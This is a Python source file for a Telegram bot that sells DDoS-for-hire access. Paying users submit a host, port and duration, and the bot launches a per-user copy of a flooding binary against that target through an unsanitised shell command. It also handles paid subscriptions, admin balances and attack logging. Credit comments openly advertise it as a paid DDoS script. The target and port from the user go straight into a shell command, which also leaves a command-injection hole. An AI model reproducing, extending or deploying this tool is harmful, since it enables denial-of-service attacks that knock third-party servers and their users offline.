import telebot
import subprocess
import datetime
import os
import time
import json
import shutil
from telebot import types
from threading import Timer, Thread
from requests.exceptions import ReadTimeout, ConnectionError

# Load configuration
CONFIG_FILE = 'config.json'
ORIGINAL_BGMI_PATH = '/workspaces/Publicvvsy/bgmi      #ADD YOUR FILES PATH HERE 
#ORIGINAL_SAHIL_PATH = '/workspaces/sahil/sahil'    #ADD YOUR FILES PATH HERE 

import random
import logging
import time
import requests

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def write_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

config = load_config()
bot = telebot.TeleBot(config['bot_token'])
ADMIN_IDS = set(config['admin_ids'])
USER_FILE = config['user_file']
LOG_FILE = config['log_file']
COOLDOWN_TIME = config['cooldown_time']
USER_COOLDOWN = 300  # Cooldown time for normal users in seconds

admin_balances = config.get('admin_balances', {})
bgmi_cooldown = {}
ongoing_attacks = {}
allowed_user_ids = {}
user_cooldowns = {}

# User management functions
def read_users():
    try:
        with open(USER_FILE, 'r') as f:
            users = json.load(f)
            return {user: datetime.datetime.fromisoformat(expiry) for user, expiry in users.items()}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def write_users(users):
    with open(USER_FILE, 'w') as f:
        json.dump({user: expiry.isoformat() for user, expiry in users.items()}, f)

allowed_user_ids = read_users()

def check_expired_users():
    current_time = datetime.datetime.now()
    expired_users = [user for user, expiry in allowed_user_ids.items() if expiry < current_time]
    for user in expired_users:
        del allowed_user_ids[user]
    if expired_users:
        write_users(allowed_user_ids)

# Logging functions
def log_command(user_id, target, port, duration):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"UserID: {user_id}"
        with open(LOG_FILE, 'a') as f:
            f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")
    except Exception as e:
        print(f"Logging error: {e}")

def clear_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w') as f:
            f.truncate(0)
        return "Logs cleared successfully ✅"
    return "Logs are already cleared. No data found."

# Bot command handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_message = (
        "👋 Welcome to the YUVI DDOS! 👋\n\n" )

    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_attack = types.KeyboardButton('🚀 Attack')
    btn_info = types.KeyboardButton('ℹ️ My Info')
    markup.add(btn_attack, btn_info)
    
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

# Bot command handlers
import shutil

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) in ADMIN_IDS:
        args = message.text.split()
        admin_user = bot.get_chat(message.chat.id)
        admin_username = f"@{admin_user.username}" if admin_user.username else f"UserID: {message.chat.id}"
        if len(args) == 3:
            user_id, duration = args[1], int(args[2])
            cost = duration * 100
            if admin_balances[str(message.chat.id)] >= cost:
                expiry_time = datetime.datetime.now() + datetime.timedelta(days=duration)
                allowed_user_ids[user_id] = expiry_time
                write_users(allowed_user_ids)
                admin_balances[str(message.chat.id)] -= cost
                config['admin_balances'] = admin_balances
                write_config(config)

                # Create copies of bgmi, sahil files for the new user
                user_bgmi_path = f'bgmi{user_id}'
                #user_sahil_path = f'sahil{user_id}'
                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
               # shutil.copy(ORIGINAL_SAHIL_PATH, user_sahil_path)

                response = f"User {user_id} added successfully for {duration} days by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
            else:
                response = f"Insufficient balance to add user. Required: {cost} Rs. Available: {admin_balances[str(message.chat.id)]} Rs."
        elif len(args) == 4 and args[2] == 'hours':
            user_id, hours = args[1], int(args[3])
            duration = hours / 24  # Convert hours to days for costing
            cost = int(duration * 100)
            if admin_balances[str(message.chat.id)] >= cost:
                expiry_time = datetime.datetime.now() + datetime.timedelta(hours=hours)
                allowed_user_ids[user_id] = expiry_time
                write_users(allowed_user_ids)
                admin_balances[str(message.chat.id)] -= cost
                config['admin_balances'] = admin_balances
                write_config(config)

                # Create copies of bgmi,sahil files for the new user
                user_bgmi_path = f'bgmi{user_id}'              
                #user_sahil_path = f'sahil{user_id}'
                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
                #shutil.copy(ORIGINAL_SAHIL_PATH, user_sahil_path)

                response = f"User {user_id} added successfully for {hours} hours by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
            else:
                response = f"Insufficient balance to add user. Required: {cost} Rs. Available: {admin_balances[str(message.chat.id)]} Rs."
        else:
            response = "Usage: /add <userId> <duration_in_days> or /add <userId> hours <duration_in_hours>"
    else:
        response = "ONLY @Yuvvii_007 CAN USE."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if str(message.chat.id) in ADMIN_IDS:
        args = message.text.split()
        admin_user = bot.get_chat(message.chat.id)
        admin_username = f"@{admin_user.username}" if admin_user.username else f"UserID: {message.chat.id}"
        if len(args) > 1:
            user_id = args[1]
            if user_id in allowed_user_ids:
                del allowed_user_ids[user_id]
                write_users(allowed_user_ids)
                response = f"User ID: {user_id} removed Successfully by {admin_username}."
            else:
                response = f"User {user_id} Not found in the list."
        else:
            response = "Please specify a user ID to remove. Usage: /remove <userid>"
    else:
        response = "ONLY OWNER CAN USE."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    response = clear_logs() if str(message.chat.id) in ADMIN_IDS else "ONLY OWNER CAN USE."
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    if str(message.chat.id) in ADMIN_IDS:
        if allowed_user_ids:
            response_lines = []
            for user_id, expiry in allowed_user_ids.items():
                try:
                    user = bot.get_chat(int(user_id))
                    username = f"@{user.username}" if user.username else f"User ID: {user_id}"
                    response_lines.append(f"- {username} - Expires: {expiry}")
                except Exception as e:
                    response_lines.append(f"- User ID: {user_id} - Expires: {expiry} (Error fetching username: {e})")
            response = "Authorized Users:\n" + "\n".join(response_lines)
        else:
            response = "No data found."
    else:
        response = "ONLY OWNER CAN USE."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    if str(message.chat.id) in ADMIN_IDS:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, 'rb') as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.send_message(message.chat.id, "No data found.")
    else:
        bot.send_message(message.chat.id, "ONLY OWNER CAN USE.")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.send_message(message.chat.id, f"🤖Your ID: {str(message.chat.id)}")

# Attack functionality
def start_attack(user_id, target, port, duration):
    attack_id = f"{user_id} {target} {port}"
    bgmi_file = f"bgmi{user_id}"
    sahil_file = f"sahil{user_id}"
    user = bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else f"UserID: {user_id}"
    log_command(user_id, target, port, duration)
    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
    bot.send_message(user_id, response)
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 10", shell=True)
    
      # Set cooldown for normal users after a successful attack
        if user_id not in ADMIN_IDS:
            user_cooldowns[user_id] = datetime.datetime.now()
    except Exception as e:
        bot.send_message(user_id, f"Error: Servers Are Busy Unable To Attack\n{e}")

def periodic_checks():
    check_expired_users()
    Timer(60, periodic_checks).start()

# Start the periodic checks
periodic_checks()

# Function to keep Codespace alive
def keep_codespace_alive():
    url = "http://localhost:8000"
    interval = 600  # 10 minutes

    while True:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"Request successful at {time.ctime()}")
            else:
                print(f"Request failed with status code {response.status_code}")
        except requests.RequestException as e:
            print(f"Request failed: {e}")
        
        time.sleep(interval)

# Starting the bot
if __name__ == '__main__':
    # Start keep-alive function in a new thread
    keep_alive_thread = Thread(target=keep_codespace_alive)
    keep_alive_thread.start()

@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def handle_attack_button(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        bot.send_message(message.chat.id, "Please provide the details for the attack in the following format:\n\n<host> <port> <time>")
        bot.register_next_step_handler(message, handle_attack_details)
    else:
        bot.send_message(message.chat.id, "🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")


def handle_attack_details(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            target, port, duration = message.text.split()
            duration = int(duration)

            # Restrict attack duration for normal users
            MAX_DURATION = 5000  # Set maximum duration (in seconds) for Normal users
            if user_id not in ADMIN_IDS and duration > MAX_DURATION:
                bot.send_message(message.chat.id, f"Duration exceeds the maximum allowed limit of {MAX_DURATION} Seconds for Normal Users.")
                return

            if user_id not in ADMIN_IDS:
                if user_id in user_cooldowns:
                    elapsed_time = (datetime.datetime.now() - user_cooldowns[user_id]).total_seconds()
                    if elapsed_time < USER_COOLDOWN:
                        cooldown_remaining = int(USER_COOLDOWN - elapsed_time)
                        bot.send_message(message.chat.id, f"Cooldown in effect. Please wait {cooldown_remaining} seconds before sending another attack.")
                        return
            thread = Thread(target=start_attack, args=(user_id, target, port, duration))
            thread.start()
        except ValueError:
            bot.send_message(message.chat.id, "Invalid format. Please provide the details in the following format:\n\n<host> <port> <time>")
    else:
        bot.send_message(message.chat.id, "🚫 Unauthorized Access! 🚫")

@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def handle_my_info_button(message):
    user_id = str(message.chat.id)
    expiry = allowed_user_ids.get(user_id)
    user = bot.get_chat(int(user_id))
    username = f"@{user.username}" if user.username else "No username available"
    role = "Admin" if user_id in ADMIN_IDS else "User"
    balance = admin_balances.get(user_id, "Not Approved")
    response = (f"🧑‍💻 User Info 🧑‍💻\n\n"
                f"📌 Role: {role}\n"
                f"🆔 User ID: {user_id}\n"
                f"📞 Username: {username}\n"
                f"⏳ Approval Expiry: {expiry if expiry else 'N/A'}\n"
                f"💰 Balance Rs: {balance} INR.")
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if str(message.chat.id) in ADMIN_IDS:
        args = message.text.split(maxsplit=1)
        if len(args) == 2:
            broadcast_message(args[1])
        else:
            bot.send_message(message.chat.id, "Please provide a message to broadcast. Usage: /broadcast <message>")
    else:
        bot.send_message(message.chat.id, "ONLY OWNER CAN USE.")

def broadcast_message(msg):
    for user_id in allowed_user_ids:
        try:
            bot.send_message(user_id, msg)
        except Exception as e:
            print(f"Error sending message to {user_id}: {e}")


# Main loop
if __name__ == '__main__':
    check_expired_users()
    Timer(86400, check_expired_users).start()  # Run check_expired_users every 24 hours
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=60)  # Increased timeout value
        except ReadTimeout:
            print("ReadTimeout occurred. Retrying...")
        except ConnectionError:
            print("ConnectionError occurred. Retrying...")
        except Exception as e:
            print(f"Unexpected error: {e}")
            time.sleep(1)


# SCRIPT MADE BY @SAHILMODZOWNER ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
# SCRIPT MADE BY @SAHILMODZOWNER ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
#(PLEASE DON'T DELETE THIS CREDIT THIS SCRIPT IS MADE BY @SAHILMODZOWNER)







































































































































































































































































































































































































































































































































































































































































# SCRIPT MADE BY @SAHILMODZOWNER ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
# SCRIPT MADE BY @SAHILMODZOWNER ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
#(PLEASE DON'T DELETE THIS CREDIT THIS SCRIPT IS MADE BY @SAHILMODZOWNER)